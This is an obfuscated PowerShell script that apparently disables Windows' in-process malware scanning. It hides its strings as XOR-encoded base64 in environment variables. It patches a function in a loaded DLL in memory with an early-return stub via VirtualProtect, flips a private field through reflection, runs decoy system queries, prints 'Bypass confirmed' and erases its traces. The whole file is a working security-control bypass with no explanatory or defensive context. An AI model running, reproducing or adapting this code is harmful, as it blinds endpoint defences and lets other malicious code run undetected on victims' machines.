$env:oocK9F5i = "pvWM9Yb1gfWQ9Zj12/W49ZT1m/WU9ZL1kPWY9ZD1m/WB9dv1tPWA9YH1mvWY9ZT1gfWc9Zr1m/Xb9bT1mPWG9Zz1oPWB9Zz1mfWG9Q=="
$env:drwnc9HJ = "svWQ9YH1s/Wc9ZD1mfWR9Q=="
$env:DSGGqy6S = "m/WB9ZH1mfWZ9dv1kfWZ9Zn1"
$env:UIW2JUMJ = "lPWY9Yb1nPW89Zv1nPWB9bP1lPWc9Zn1kPWR9Q=="
$env:tr3ExbRG = "svWQ9YH1o/WU9Zn1gPWQ9Q=="
$env:N7Yas8lW = "BDC63536"
$env:bmogY1XX = "svWQ9YH1ofWM9YX1kPU="
$env:dhfP5L6r = "pvWQ9YH1o/WU9Zn1gPWQ9Q=="
$env:WvBs8dI0 = "nvWQ9Yf1m/WQ9Zn1xvXH9Q=="
$env:d632kDFB = "sPWB9YL1sPWD9ZD1m/WB9aL1h/Wc9YH1kPWh9Yf1lPWb9Yb1k/WQ9Yf1"

function fbOBAZO($n){$b=[Convert]::FromBase64String([Environment]::GetEnvironmentVariable($n));$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=$b[$i] -bxor 245};[Text.Encoding]::Unicode.GetString([byte[]]$r)}

$a9e = fbOBAZO 'bmogY1XX'
$ht6 = fbOBAZO 'drwnc9HJ'
$k0n = fbOBAZO 'dhfP5L6r'
$eat = fbOBAZO 'tr3ExbRG'
$e0h = [System.Reflection.BindingFlags]((0x95 -bxor 0xB5) + (0xC9 -bxor 0xC1))

$t1e = fbOBAZO 'oocK9F5i'
$o4n = $null
foreach ($d4g in [AppDomain]::CurrentDomain.GetAssemblies()) {
  if ($d4g.$a9e($t1e) -ne $null) { $o4n = $d4g; break }
}

try {
  try {
    $o0y = fbOBAZO 'WvBs8dI0'
    $cyh = fbOBAZO 'd632kDFB'
    $pou = fbOBAZO 'DSGGqy6S'
    $code = @"
using System;
using System.Runtime.InteropServices;
public class WtVoIY {
  [DllImport("$o0y", EntryPoint="LoadLibraryA")]
  public static extern IntPtr mcCW(string n);
  [DllImport("$o0y", EntryPoint="GetProcAddress")]
  public static extern IntPtr mWdK(IntPtr h, string n);
  [DllImport("$o0y", EntryPoint="VirtualProtect")]
  public static extern bool mkjH(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
    Add-Type -TypeDefinition $code
    $l4t = [WtVoIY]::mcCW($pou)
    $g8l = [WtVoIY]::mWdK($l4t, $cyh)
    $jmf = 0
    [WtVoIY]::mkjH($g8l, [uint32]4, 0x40, [ref]$jmf) | Out-Null
    $ph = [Environment]::GetEnvironmentVariable("N7Yas8lW")
    $awk = @()
    for($i=0;$i -lt $ph.Length;$i+=2){
      $awk += [Convert]::ToByte($ph.Substring($i,2),16) -bxor 245
    }
    [System.Runtime.InteropServices.Marshal]::Copy([byte[]]$awk, 0, $g8l, 4)
    [WtVoIY]::mkjH($g8l, [uint32]4, $jmf, [ref]$jmf) | Out-Null
    Write-Host '[+] Stage 1 OK'
  } catch {
    Write-Host '[!] Stage 1 failed'
  }


  $null = [Environment]::OSVersion.Version
  $null = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption
  Start-Sleep -Milliseconds 117
  $null = (Get-WmiObject Win32_Processor).Name

  try {
    $iz9 = fbOBAZO 'oocK9F5i'
    $ul3 = $o4n.$a9e($iz9)
    $lr5 = fbOBAZO 'UIW2JUMJ'
    $ghj = [System.DateTime]::Now.Ticks
    $wt2 = $ul3.$ht6($lr5, $e0h)
    $wt2.$k0n($null, $true)
    $zlc = $wt2.$eat($null)
    if ($zlc -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

  try {
    $niw = fbOBAZO 'oocK9F5i'
    $dli = $o4n.$a9e($niw)
    if ($dli -ne $null) {
      Write-Host '[+] Bypass confirmed'
    } else {
      Write-Host '[!] Bypass failed'
    }
  } catch {
    Write-Host '[!] Bypass failed'
  }
}
finally {
  Remove-Item Env:\bmogY1XX -ErrorAction SilentlyContinue
  Remove-Item Env:\drwnc9HJ -ErrorAction SilentlyContinue
  Remove-Item Env:\dhfP5L6r -ErrorAction SilentlyContinue
  Remove-Item Env:\tr3ExbRG -ErrorAction SilentlyContinue
  Remove-Item Env:\oocK9F5i -ErrorAction SilentlyContinue
  Remove-Item Env:\UIW2JUMJ -ErrorAction SilentlyContinue
  Remove-Item Env:\d632kDFB -ErrorAction SilentlyContinue
  Remove-Item Env:\DSGGqy6S -ErrorAction SilentlyContinue
  Remove-Item Env:\WvBs8dI0 -ErrorAction SilentlyContinue
  Remove-Item Env:\N7Yas8lW -ErrorAction SilentlyContinue
}
